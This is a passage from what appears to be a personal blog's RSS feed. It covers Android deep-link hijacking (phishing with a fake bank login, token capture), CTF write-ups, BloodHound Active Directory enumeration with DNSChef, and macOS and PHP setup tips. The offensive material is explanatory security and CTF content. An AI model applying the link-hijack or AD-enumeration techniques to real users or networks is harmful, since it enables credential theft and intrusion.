2017 study</a>, most apps that use App Links are not correctly completing the verification process! <br>Some common errors included:</p><ul><li>Not creating the associate file</li><li>Registering the App Link with a protocol that doesn&apos;t match the file (<code>HTTP</code> vs <code>HTTPS</code>)</li><li>Having an invalid associate file</li><li>Having an invalid manifest file</li></ul><p>Finally, there is one type of Android app that is particularly vulnerable to link hijacking even when using App Links: <a href="https://developer.android.com/topic/google-play-instant">Instant Apps</a>.</p><p>This article won&apos;t go into detail regarding these vulnerabilities, but if you&apos;re interested I highly recommend <a href="http://www4.comp.polyu.edu.hk/~csxluo/AppLink.pdf">this paper</a>.</p><h3 id="intent-urls">Intent URLs</h3><p>Finally, let&apos;s look at the least used deep link type: Intent URLs. They were introduced in 2013 and have a completely different syntax:</p><p><code>intent://p/#Intent;scheme=foo;package=com.foo;end</code>. </p><p>As you can see, the package name of the target app is explicitly specified, which means the OS doesn&apos;t prompt the user for their decision, making them <strong>resistant to the types of link hijacking detailed below</strong>.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.35.13.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="414" height="110"></figure><hr><h2 id="link-hijacking">Link Hijacking</h2><p>As mentioned before, the fact that any application can register any Scheme URL, along with the improper implementation of App Links can make applications vulnerable to Link Hijacking, also known as &quot;Deep Link Collision&quot;.</p><p>But, why is this an issue?</p><h3 id="phishing">Phishing</h3><p>Imagine that a user installs a game application on their Android phone. Whenever the user opens the app they just see the game but, in fact, during installation this application registered a deep link that &quot;belongs&quot; to a banking app - <code>abcbank://</code> - which just so happens to be the user&apos;s bank.</p><p>One day this user happens to click on the same deep link registered by the &quot;malicious&quot; game app - this isn&apos;t strange since it&apos;s a valid deep link used by the actual ABC Bank.</p><p>Since the user doesn&apos;t yet have the <code>abcbank</code> application installed on their phone, the OS will automatically open the link with the game app. However, now instead of showing the regular game UI, this malicious app displays a login screen that looks exactly like the login screen for <code>abcbank</code>.</p><p>If the malicious application is able to trick the user into entering their <code>ABC Bank</code> credentials on this login screen, it&apos;s game over.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1436" height="805" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-21.27.40.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-21.27.40.png 1436w" sizes="(min-width: 720px) 720px"></figure><h3 id="capturing-sensitive-data">Capturing Sensitive Data</h3><p>In 2019, it was <a href="https://hackerone.com/reports/855618">reported</a> that the Arrive app (now called <a href="https://play.google.com/store/apps/details?id=com.shopify.arrive&amp;hl=en_US&amp;gl=US">Shop</a>) was vulnerable to Account Takeover due to an unverified App Link:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="987" height="463" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-18.23.49.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-18.23.49.png 987w"></figure><p>As shown in this example, whenever deep links are used to communicate sensitive data such as authentication tokens, an attacker can use link hijacking to intercept this data.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 1" loading="lazy" width="1437" height="806" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-13-at-22.35.39.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-13-at-22.35.39.png 1437w" sizes="(min-width: 720px) 720px"></figure><h3 id="traffic-hijacking">Traffic Hijacking</h3><p>In their 2017 study, &quot;<a href="https://people.cs.vt.edu/gangwang/deep17.pdf">Measuring the Insecurity of Mobile Deep Links of Android</a>&quot;, Liu et al. reviewed 160,000+ applications (retrieved from the Play Store) and found many instances of applications that seemed to be registering custom schemes for popular applications in order to boost traffic to their own app. </p><p>They found, for example, that <code>google.com</code> is registered by 480 apps from 305 non-Google developers and that <code>google.navigation</code> from Google Maps was hijacked by 79 apps from 32 developers.</p><h3 id="competing-apps">Competing Apps</h3><p>In the same study mentioned above, it was found that a lot of applications register their competitors&apos; schemes in order to trick users into using their apps:</p><blockquote>For example, Careem (<code>com.careem.acma</code>) and QatarTaxi (<code>com.qatar.qatartaxi</code>) are two competing taxi booking apps in Dubai. Careem is more popular (5M+ downloads), which uses scheme <code>careem</code> for many functionalities such as booking a ride (from hotel websites) and adding credit card information. <br>QatarTaxi (10K downloads) registers to receive all <code>careem://*</code> deep links.<br>After code analysis, we find all these links redirect users to the QatarTaxi app&#x2019;s home screen, as an attempt to draw customers.</blockquote><hr><p>Hope you found this useful, on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">the next part</a> we&apos;ll try to see what happens when a user clicks on a malicious deep link.</p>]]></content:encoded></item><item><title><![CDATA[Running a PHP application on Big Sur using Apache]]></title><description><![CDATA[<p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd</code></pre>]]></description><link>inesmartins.github.io/running-php-app-on-big-sur-using-apache/</link><guid isPermaLink="false">60f93a52fd1c6c08ebab9dd6</guid><category><![CDATA[php]]></category><category><![CDATA[apache]]></category><category><![CDATA[big sur]]></category><category><![CDATA[macOS]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 23 Jul 2021 10:18:15 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/screen-shot-2020_-macos-big-sur.png" alt="Running a PHP application on Big Sur using Apache"><p>If you have a PHP application and want a quick approach for running it on a mac with the latest OS version, then this tutorial might be useful.</p><hr><h3 id="testing-and-launching-the-apache-server">Testing and launching the Apache server</h3><p>Big Sur already comes with <code>Apache</code> installed. You can check the current version by running:</p><pre><code>~ httpd -v 
Server version: Apache/2.4.46 (Unix)
Server built:   May  8 2021 03:38:34</code></pre><p>In order to start the server you can run:</p><pre><code>~ sudo apachectl start</code></pre><p>Open &#xA0;<code>localhost</code> in any browser and you should see:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-10.38.05.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="413" height="105"></figure><h3 id="configuring-apache-to-run-php-7">Configuring Apache to run PHP 7</h3><p>Big Sur also comes with PHP installed, but the local Apache configs may not support running PHP by default. </p><p>In order to activate this setting, open <code>/etc/apache2/httpd.conf</code> with <code>nano</code> or any other text editor and uncomment the following line:</p><pre><code>LoadModule php7_module libexec/apache2/libphp7.so</code></pre><p>PHP is now enabled, all you need to do is restart the Apache web server for the changes to take effect:</p><pre><code>~ sudo apachectl restart</code></pre><h3 id="setting-up-mysql">Setting up mySQL</h3><p>Ensure that you have mySQL correctly installed and running on your machine.</p><ul><li>you can download the <code>.dmg</code> from <a href="https://dev.mysql.com/downloads/mysql/">here</a>, then follow the instructions on the wizard. </li><li>once the wizard is done go to <code>System Preferences</code> &gt; <code>MySQL</code> and ensure that the server is running as shown below:</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="671" height="564" srcset="inesmartins.github.io/content/images/size/w600/2021/07/Screenshot-2021-07-22-at-11.43.55.png 600w, inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png 671w"></figure><p>In order to have mySQL binaries available via command line, you can also add <code>/usr/local/mysql/bin/</code> to the <code>PATH</code>. In my case I did:</p><pre><code>~ nano ~/.zshrc
...
export PATH=/usr/local/mysql/bin:$PATH</code></pre><p>Finally, you need to ensure PHP and MySQL can communicate with one another, which you can achieve by running:</p><pre><code>~ cd /var
~ sudo mkdir mysql
~ cd mysql
~ sudo ln -s /tmp/mysql.sock mysql.sock</code></pre><h3 id="serving-the-application">Serving the application</h3><p>Check Apache&apos;s default <code>DocumentRoot</code> on <code>/etc/apache2/httpd.conf</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/image-1.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="592" height="135"></figure><p>As you can see, in my case it&apos;s <code>/Library/WebServer/Documents</code>.</p><p>This means that this is the <strong>directory where you should put your PHP application</strong>.</p><p>Once the app is inside this directory you&apos;ll be able to see it running by going to &#xA0;<a href="http://localhost/app/web/">http://localhost/&lt;</a>path-to-your-initial-file&gt;.</p>]]></content:encoded></item><item><title><![CDATA[USB Keyboard capture parser]]></title><description><![CDATA[<p>During a recent CTF I had to extract keys from a USB Keyboard capture, and (as usual) decided to create a simple Python 3 script to parse the original keys.</p><p>As shown on the <a href="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js">Gist below</a>, this script takes any <code>.pcap</code> file and optionally the path to the <code>tshark</code> executable,</p>]]></description><link>inesmartins.github.io/usb-keyboard-capture-parser/</link><guid isPermaLink="false">60d63298eb71c50b03cad85d</guid><category><![CDATA[tshark]]></category><category><![CDATA[pcap]]></category><category><![CDATA[usb keyboard]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 18 Jul 2021 11:20:39 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-18-at-12.24.09.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-18-at-12.24.09.png" alt="USB Keyboard capture parser"><p>During a recent CTF I had to extract keys from a USB Keyboard capture, and (as usual) decided to create a simple Python 3 script to parse the original keys.</p><p>As shown on the <a href="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js">Gist below</a>, this script takes any <code>.pcap</code> file and optionally the path to the <code>tshark</code> executable, and:</p><ol><li>extracts the relevant data from the capture file to a temporary <code>.txt</code> file, using <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark</a></li><li>parses each line from this file and extracts the relevant data, namely the key value and whether or not the <code>Shift</code> key was pressed</li><li>maps the key value and shift to the corresponding symbol on the keyboard</li><li>removes the temporary file</li><li>prints the resulting string</li></ol><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js"></script><!--kg-card-end: html--><p>As an example:</p><pre><code>~ python3 mousejack.py -f mousejack.pcapng -t /Applications/Wireshark.app/Contents/MacOS/tshark

&gt; flag{usb_sniff_sniff}</code></pre>]]></content:encoded></item><item><title><![CDATA[Setting up Bloodhound on macOS]]></title><description><![CDATA[<p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3</code></p>]]></description><link>inesmartins.github.io/setting-up-bloodhound-on-macos/</link><guid isPermaLink="false">60d8afdeeb71c50b03cada18</guid><category><![CDATA[bloodhound]]></category><category><![CDATA[windows]]></category><category><![CDATA[ad]]></category><category><![CDATA[macOS]]></category><category><![CDATA[tips]]></category><category><![CDATA[troubleshooting]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 11 Jul 2021 13:37:13 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" alt="Setting up Bloodhound on macOS"><p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3</code> to be able to use <code>Bloodhound.py</code>.</p><p>Here&apos;s a great StackOverflow answer that explains how to do this downgrade using <code>pyenv</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/a/62899833"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to downgrade python version from 3.8 to 3.7 (mac)</div><div class="kg-bookmark-description">I&#x2019;m using Python &amp;amp; okta-aws tools and in order to fetch correct credentials on aws I need to run okta-aws init. But got an error message of Could not read roles from Okta and the system prompte...</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt="Setting up Bloodhound on macOS"><span class="kg-bookmark-author">Stack Overflow</span><span class="kg-bookmark-publisher">user13902742</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="Setting up Bloodhound on macOS"></div></a></figure><p>After this process you should now have something like:</p><pre><code>~ python3 --version
Python 3.7.3</code></pre><hr><h2 id="collecting-the-data">Collecting the data</h2><p>On Windows, data collection is done with <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html">SharpHound</a>:</p><blockquote>SharpHound is the official data collector for BloodHound. It is written in C# and uses native Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems.</blockquote><p>On macOS, you can use <code>Bloodhoud.py</code>, but you also need an additional tool that resolves the AD domain to its IP. I went with <code>DNSChef</code> but you can choose whatever works best.</p><p>So, start by cloning the <a href="https://github.com/fox-it/BloodHound.py">Bloodhound<a href="https://github.com/fox-it/BloodHound.py">.</a>py</a> and <a href="https://github.com/iphelix/dnschef">dnschef.py</a> projects and install the requirements as specified on the <code>README.md</code> files.</p><p>Once both projects are correctly installed, you need to set up <a href="https://github.com/iphelix/dnschef">dnschef.py</a> so that it resolves your AD domain to its corresponding IP, as previously mentioned:</p><pre><code>~ sudo sh -c &apos;python3 dnschef.py --fakeip x.x.x.x --fakedomains abc.local -q&apos;

(20:14:25) [*] DNSChef started on interface: 127.0.0.1
(20:14:25) [*] Using the following nameservers: 8.8.8.8
(20:14:25) [*] Cooking A replies to point to x.x.x.x matching: abc.local
</code></pre><p>Next, you can run the Bloodhound script, but make sure to point to your &quot;fake&quot; nameserver:</p><pre><code>~ python3 ../bloodhound.py -d abc.local -u theusername -p &apos;thepassword&apos; -dc abc.local -c all -ns 127.0.0.1

INFO: Connecting to LDAP server: abc.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: abc.local
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: XXX1.abc.local
INFO: Querying computer: XXX2.abc.local
INFO: Ignoring host XXX1.abc.local since its hostname does not match: Supplied hostname XXX1.abc.local does not match reported hostnames dc1 or dc1.abc.local
INFO: Done in 00M 08S</code></pre><p>This process should output some <code>.json</code> files to your local directory. You&apos;ll be able to import and visualise the data on the next step.</p><hr><h2 id="visualising-the-data">Visualising the data</h2><p>Start by downloading the macOS versions of both <a href="https://neo4j.com/download-center/#community">neo4j Community Edition Server</a> and <a href="https://github.com/BloodHoundAD/BloodHound/releases">Bloodhound GUI</a>.</p><p>Then, go to the directory where you downloaded <code>neo4j</code> and run:</p><pre><code>~ tar -xf neo4j-community-x.x.x-unix.tar
~ cd neo4j-community-x.x.x/bin
~ ./neo4j console</code></pre><p>Once the <code>neo4j</code> console application is running, go to <a href="http://localhost:7474">http://localhost:7474</a> and authenticate with credentials: <code>neo4j/neo4j</code>. </p><p>You&apos;ll be prompted to change the password, so make sure to save these new creds, you&apos;ll need for the next step.</p><p>Now, go to the directory where you downloaded <code>Bloodhound GUI</code> and launch the app. </p><p>Leave the default DB URL and enter the same credentials you just set up for <code>neo4j</code>.</p><p>After logging in, on the right side, you&apos;ll see an icon to upload data. Click on the icon and import the <code>.json</code> files outputted on the previous step.</p><p>You should now have everything you need to visualise your AD info using Bloodhound! </p>]]></content:encoded></item><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p>]]></description><link>inesmartins.github.io/simplest-way-to-host-your-ghost-blog-on-github-pages/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" alt="Update: Simplest way to host your Ghost blog on GitHub Pages"><p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: <code>inesmartins.github.io</code>:</li></ul><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/6f90f6a2812c7727d25ae3f9a3771b35.js"></script><!--kg-card-end: html--><p>(based on script from <a href="https://fizzy.cc/ghost-static-generator/">fizzy.cc</a>)</p><p>This script generate a <code>static</code> directory with the entire content of your Ghost instance as a static website. Just copy this content to the Github Pages repository, and your website will be instantly updated.</p><p>In order to make this process even easier, I created an NPM script, which makes this as easy as running: <code>npm run publish</code> on your original repository:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/7fbd5dc9ed1cc418d27386559581cd43.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - HTTP2]]></title><description><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol,</p>]]></description><link>inesmartins.github.io/oposec-http2/</link><guid isPermaLink="false">60aa1e4ce1e20f0a69e2a808</guid><category><![CDATA[oposec]]></category><category><![CDATA[http2]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 28 May 2021 11:30:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><img src="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" alt="&#xD8;xOPOS&#x246;C - HTTP2"><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol, so it makes sense that this challenge is about some HTTP feature, either new or deprecated.</p><p>Using <code>curl</code> to fetch the page we see that it&apos;s served via <code>HTTP/2</code>, which is still kind of rare in the wild:</p><pre><code>~ curl -ik https://20.56.49.147/
HTTP/2 200
server: nginx/1.19.10
date: Fri, 28 May 2021 11:27:17 GMT
content-type: text/html
content-length: 129
last-modified: Thu, 20 May 2021 10:10:20 GMT
etag: &quot;60a6358c-81&quot;
accept-ranges: bytes

&lt;img src=&quot;https://raw.githubusercontent.com/verhas/pushbuilder/master/http-versions.png&quot;&gt;
&lt;!-- Lost? It&apos;s evolution, baby... --&gt;</code></pre><p><code>HTTP/2</code> supports the <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">Server Push</a> feature, which basically enables servers to send assets to the client without the client having to request them, which is the perfect setup for a hidden file, like the flag.</p><p>In order to log these &quot;hidden&quot; request, we can use <a href="chrome://net-export/">Chrome Net Export tool</a>:</p><ul><li>Open up a new Chrome tab and enter <code>chrome://net-export/</code>:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-86.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="1167" height="415" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-86.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-86.png 1000w, inesmartins.github.io/content/images/2021/05/image-86.png 1167w"></figure><ul><li>Click &quot;Start Logging to Disk&quot; and choose the file where you want to write on your computer;</li><li>Go to the challenge website and reload it;</li><li>Go back to the Chrome Net Export tool and click &quot;Stop Logging&quot;;</li><li>Click &quot;Show file&quot; to see the log file;</li><li>Search for the word <code>flag</code> among the results:</li></ul><pre><code>...
{
   &quot;params&quot;:{
      &quot;headers&quot;:[
         &quot;:method: GET&quot;,
         &quot;:path: /flag_652f92e28feb20d2dc22874d54cefb9b0cf96ce5c65552161fdaad4a33776394.txt&quot;,
         &quot;:scheme: https&quot;,
         &quot;:authority: 20.56.49.147&quot;,
         &quot;accept-encoding: gzip, deflate, br&quot;,
         &quot;accept-language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7&quot;,
         &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;
      ],
      &quot;id&quot;:1,&quot;promised_stream_id&quot;:2
   },
   ...
},
...</code></pre><ul><li>Access the resource and get the flag:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-87.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="951" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-87.png 600w, inesmartins.github.io/content/images/2021/05/image-87.png 951w"></figure><p>Note that alternatively, we could have simply used <a href="https://nghttp2.org/">Nghttp2</a>.</p>]]></content:encoded></item><item><title><![CDATA[Fixing keyboard type on Big Sur]]></title><description><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go</li></ul>]]></description><link>inesmartins.github.io/fixing-keyboard-type-on-big-sur/</link><guid isPermaLink="false">609fdd03f0e974043bb7b5c0</guid><category><![CDATA[macOS]]></category><category><![CDATA[troubleshooting]]></category><category><![CDATA[keyboard type]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 15 May 2021 14:56:08 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/1-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/1-1.png" alt="Fixing keyboard type on Big Sur"><p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go to <code>/Library/Preferences</code> and see if you can find <code>com.apple.keyboardtype.plist</code></li></ul><pre><code>~ cd /Library/Preferences
~ ls | grep keyboard</code></pre><ul><li>Either remove it or move it somewhere else (if you want to have a backup)</li></ul><pre><code>~ sudo rm com.apple.keyboardtype.plist</code></pre><ul><li>Restart the computer</li><li>You&apos;ll be prompted to setup your keyboard again</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/1-1.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="700" height="510" srcset="inesmartins.github.io/content/images/size/w600/2021/05/1-1.png 600w, inesmartins.github.io/content/images/2021/05/1-1.png 700w"></figure><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/2.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="723" height="530" srcset="inesmartins.github.io/content/images/size/w600/2021/05/2.png 600w, inesmartins.github.io/content/images/2021/05/2.png 723w" sizes="(min-width: 720px) 720px"></figure><ul><li>Confirm your keyboard type and that&apos;s it</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/3.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="686" height="512" srcset="inesmartins.github.io/content/images/size/w600/2021/05/3.png 600w, inesmartins.github.io/content/images/2021/05/3.png 686w"></figure>]]></content:encoded></item></channel></rss>